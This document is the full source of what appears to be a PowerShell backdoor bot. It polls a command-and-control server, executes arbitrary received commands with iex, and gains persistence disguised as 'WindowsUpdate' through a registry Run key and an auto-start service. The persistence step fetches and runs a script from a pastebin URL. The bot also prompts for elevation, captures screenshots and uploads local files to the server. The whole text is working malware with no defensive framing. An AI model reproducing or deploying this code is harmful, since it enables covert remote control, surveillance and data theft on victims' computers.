$SRVURL = 'http://localhost:8080'
$SCRIPTURL = 'http://pastebin.com/MJaec4Lu'
$REQUEST_INTERVAL = 10

$BOTID = $(hostname)
$SVC_NAME = "WindowsUpdate"
$SVCPATH = $env:temp + "\winupdate.vbs"
$OS = $((Get-WmiObject -class Win32_OperatingSystem).Caption)

function isAdmin {
    $winID = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $winPrincipal = new-object System.Security.Principal.WindowsPrincipal($winID)
    $adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator

    return $winPrincipal.IsInRole($adminRole)
}
 
function user-persist {
    echo 'Set oShell = WScript.CreateObject ("WScript.Shell")' > $SVCPATH
    echo 'oShell.run "powershell -WindowStyle Hidden -nop -c ""iex (New-Object Net.WebClient).DownloadString(''' + $SCRIPTURL + ''')""", 0' >> $SVCPATH
    New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $SVC_NAME -Value $SVCPATH
    
    SendOutput "User persistence OK";
}

function admin-persist {
    
    if (-Not (isAdmin)) {
        SendOutput "Unsufficient privileges"
        return
    }

    # Remove user persistence (if any)
    $autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
    if ($autoruns.$SVC_NAME) {
        Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $SVC_NAME
    }
   
    echo 'Set oShell = WScript.CreateObject ("WScript.Shell")' > $SVCPATH
    echo 'oShell.run "powershell -WindowStyle Hidden -nop -c ""iex (New-Object Net.WebClient).DownloadString(''' + $SCRIPTURL + ''')""", 0' >> $SVCPATH 
    cmd.exe /c sc create $SVC_NAME binPath= "wscript.exe $SVCPATH" start= auto

    SendOutput "Admin persistence OK";
}

function eject {
    SendOutput "Removing files..."
    rm $SVCPATH
    SendOutput "Removing registry key..."
    Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $SVC_NAME
    if (isAdmin) {
        SendOutput "Removing service"
        cmd.exe /c sc delete $SVC_NAME
    }
    SendOutput "Everything clean. Killing process...bye !"
    exit
}

function zipdir {
    param (
        [string]$dir,
        [string]$dest = $env:temp
    )
   Add-Type -Assembly System.IO.Compression.FileSystem
   $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal
   $outfile = $dest + "\" + ($dir.split('/')).split('\')[-1] + ".zip"
   [System.IO.Compression.ZipFile]::CreateFromDirectory(
   $dir, $outfile, $compressionLevel, $false)
   return $outfile
}

function upload {
    param (
        [string]$filepath = ""
     )
    if (Test-Path $filepath -pathtype container) {
        $zipped = (zipdir $filepath)
        upload $zipped
        rm $zipped
    }
    else {
        $filename = $filepath.split("/")[-1]
        $filename = $filename.split("\\")[-1]
        (New-Object Net.WebClient).UploadFile($SRVURL + "/api/uploadpsh?botid=" + $BOTID + "&src=" + $filename, $filepath);
    }
}

function download {
    param (
        [string]$url = "",
        [string]$target = ""
     )
    (New-Object Net.WebClient).DownloadFile($url, $target)
    SendOutput ("Downloaded " + $url + " > " + $target)
}

 Function screenshot {
    $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen
    $ScreenshotObject = New-Object Drawing.Bitmap $ScreenBounds.Width, $ScreenBounds.Height
    $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
    $DrawingGraphics.CopyFromScreen( $ScreenBounds.Location, [Drawing.Point]::Empty, $ScreenBounds.Size)
    $DrawingGraphics.Dispose()
    $filepath = $env:temp + "\" + $(date -format dd-m-y-HH-mm-s) + ".png"
    $ScreenshotObject.Save($filepath)
    $ScreenshotObject.Dispose()
    upload $filepath
    rm $filepath
}

function elevate {

    if (isAdmin)
    {
        SendOutput "Already admin !";
    }

    else
    {
       $newProcess = new-object System.Diagnostics.ProcessStartInfo "PowerShell"; 
       $newProcess.Arguments = "-WindowStyle Hidden -c ""iex (New-Object Net.WebClient).DownloadString('$SCRIPTURL')""";
       $newProcess.Verb = "runas";

       
       SendOutput "Elevating...";
       echo $pid > ("$env:temp\elevatedfrom")
       [System.Diagnostics.Process]::Start($newProcess);
    }
}

function sendOutput {
     param (
        [string]$output = ""
     )

    $values = New-Object System.Collections.Specialized.NameValueCollection;
    $values.Add("botid", $BOTID);
    $values.Add("output", $output);

    $wc = New-Object System.Net.WebClient
    $wc.UploadValues($SRVURL + "/api/report","post", $values);

    $WC.Dispose();
}


function getCmd {
    return (New-Object Net.WebClient).DownloadString($SRVURL + '/api/pop?botid=' + $BOTID + '&sysinfo=' + $OS);
}

if (test-path ("$env:temp\elevatedfrom")) {
    kill $(cat "$env:temp\elevatedfrom")
    rm "$env:temp\elevatedfrom"
    sendOutput "Successfully elevated !"
}

$output = ''
do {
    try {
        $cmd = getCmd;
        echo $cmd
        if ($cmd) {
            try {
                # Try to launch an elevated instance of the backdoor
                if ($cmd -eq "elevate") {
                    elevate
                }
                # Make the agent persistent
                elseif ($cmd -eq "user-persist") {
                    user-persist
                }
                # Make the agent persistent (with administrative privileges)
                elseif ($cmd -eq "admin-persist") {
                    admin-persist
                }
                # Load a powershell script from an URL
                elseif ($cmd.StartsWith("load ")) {
                    $output = [string](iex (New-Object Net.WebClient).DownloadString((-split $cmd)[1]))
                }
                # Grab a screenshot
                elseif ($cmd -eq "screenshot") {
                    screenshot
                }
                # Removes the agent from the host
                elseif ($cmd -eq "eject") {
                    eject
                }
                # Upload a local file 
                elseif ($cmd.StartsWith("upload ")) {
                    $filepath = $cmd.split(" ")[1]
                    upload $filepath
                }
                # Download a file from the internet
                elseif ($cmd.StartsWith("download ")) {
                    $url = $cmd.split(" ")[1]
                    $filename = $url.split('/')[-1]
                    download $url $filename
                }
                # Execute command
                else {
                    try {
                        $output = [string](iex $cmd)
                    }
                    catch {
                        $output = $_.Exception.Message
                    }                
                    if ($output) {
                        SendOutput $output;
                    }
                }
            }
            catch {
                sendOutput $_.Exception.Message
            }
        }
        else {
            Start-Sleep $REQUEST_INTERVAL
        }
    }
    catch {
        echo $_.Exception.Message;
    }
} while ($true)
